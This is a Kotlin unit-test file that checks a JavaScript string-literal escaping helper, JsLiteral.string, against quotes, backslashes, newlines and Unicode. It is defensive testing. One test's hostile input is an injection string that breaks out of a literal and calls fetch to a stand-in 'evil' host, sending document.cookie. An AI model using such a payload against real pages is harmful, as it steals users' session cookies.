package com.taskpilot.assistant.policy

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class JsLiteralTest {

    @Test
    fun escapesQuotesBackslashesAndNewlines() {
        assertEquals("\"a\\\"b\\\\c\\nd\"", JsLiteral.string("a\"b\\c\nd"))
    }

    @Test
    fun outputIsPureAsciiAndCannotBreakOut() {
        val hostile = "\"); fetch('https://evil/?c='+document.cookie); (\"" +
            "</script>\u2028\u2029`\${x}` ' é لبنان \uD83D\uDE00"
        val lit = JsLiteral.string(hostile)
        assertTrue(lit.startsWith("\"") && lit.endsWith("\""))
        assertTrue("Literal must be printable ASCII", lit.all { it.code in 0x20..0x7E })
        // The only unescaped double quotes are the delimiters.
        val inner = lit.substring(1, lit.length - 1)
        var i = 0
        while (i < inner.length) {
            if (inner[i] == '\\') { i += 2; continue }
            assertFalse("Unescaped quote at $i in $inner", inner[i] == '"')
            i++
        }
        assertFalse(inner.contains("<") || inner.contains(">") || inner.contains("'") || inner.contains("`"))
    }

    @Test
    fun escapesUnicodeAsUtf16Units() {
        assertEquals("\"\\u00E9\"", JsLiteral.string("é"))
        assertEquals("\"\\uD83D\\uDE00\"", JsLiteral.string("\uD83D\uDE00"))
        assertEquals("\"\\u2028\"", JsLiteral.string("\u2028"))
    }
}
